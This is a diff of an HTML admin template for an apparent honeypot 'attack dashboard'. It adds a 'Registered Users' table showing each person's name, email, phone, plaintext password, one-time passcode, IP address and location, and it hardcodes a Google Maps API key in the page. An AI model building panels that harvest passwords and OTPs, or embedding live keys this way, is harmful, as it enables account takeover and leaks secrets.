@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HoneyMonitor — Attack Dashboard</title>
+    <title>HoneyPot — Attack Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
     
-    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBs_VTTJgw_C7C3CDwTAUbESnV0wceajGY"></script>
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAOrJu6-tw7aZsDz0Nd8_mIFwB_ed1bG2M"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <style>
         :root {
@@ -208,6 +208,7 @@
     <button class="sb-btn"        data-tip="Behavior"    onclick="show('behavior',this)">👁</button>
     <button class="sb-btn"        data-tip="Credentials" onclick="show('creds',this)">🔑</button>
     <button class="sb-btn"        data-tip="Countries"   onclick="show('countries',this)">🌐</button>
+    <button class="sb-btn"        data-tip="Registered"  onclick="show('registered',this)">📝</button>
     <div class="sb-spacer"></div>
     <a href="/admin/logout" class="sb-logout" data-tip="Logout">⏻</a>
 </aside>
@@ -215,8 +216,7 @@
 <main class="main">
     <div class="topbar">
         <div>
-            <h1>HONEY<span>MONITOR</span></h1>
-            <p>HoneyMonitor — Attack Dashboard</p>
+            <h1>HONEY<span>POT</span></h1>
         </div>
         <div class="live-pill"><div class="live-dot"></div>LIVE MONITORING</div>
     </div>
@@ -241,6 +241,11 @@
             <div class="stat-icon">🛡</div>
             <div class="stat-val" style="font-size:20px;padding-top:9px">ACTIVE</div>
             <div class="stat-label">System Status</div>
+        </div>
+        <div class="stat" style="border-top:2px solid #e040fb">
+            <div class="stat-icon">📝</div>
+            <div class="stat-val" style="color:#e040fb">{{ total_registered }}</div>
+            <div class="stat-label">Registered Users</div>
         </div>
     </div>
 
@@ -409,6 +414,44 @@
             </div>
         </div>
     </div>
+
+    <!-- REGISTERED USERS -->
+    <div id="sec-registered" class="section">
+        <div class="panel">
+            <div class="panel-head">
+                <h3><span class="ph-icon">📝</span>Registered Users</h3>
+                <span class="badge-sm">{{ registered_users|length }} RECORDS</span>
+            </div>
+            <div class="tbl-wrap" style="max-height:600px">
+                <table>
+                    <thead><tr>
+                        <th>#</th><th>Name</th><th>Email</th>
+                        <th>Phone</th><th>Password</th><th>OTP</th>
+                        <th>IP</th><th>Country</th><th>City</th><th>Time</th>
+                    </tr></thead>
+                    <tbody>
+                    {% for u in registered_users %}
+                    <tr>
+                        <td style="font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)">{{ u.id }}</td>
+                        <td style="color:var(--text)">{{ u.name }}</td>
+                        <td><span class="tag tag-user">{{ u.email }}</span></td>
+                        <td style="color:var(--cyan)">{{ u.phone }}</td>
+                        <td><span class="tag tag-pass">{{ u.password }}</span></td>
+                        <td><span class="tag" style="background:rgba(224,64,251,.08);color:#e040fb;border:1px solid rgba(224,64,251,.2)">{{ u.otp }}</span></td>
+                        <td><span class="tag tag-ip">{{ u.ip }}</span></td>
+                        <td>{{ u.country }}</td>
+                        <td style="color:var(--muted)">{{ u.city }}</td>
+                        <td style="font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)">{{ u.timestamp }}</td>
+                    </tr>
+                    {% else %}
+                    <tr><td colspan="10"><div class="empty"><div class="ei">📝</div>No registrations yet.</div></td></tr>
+                    {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
 </main>
 
 <style>
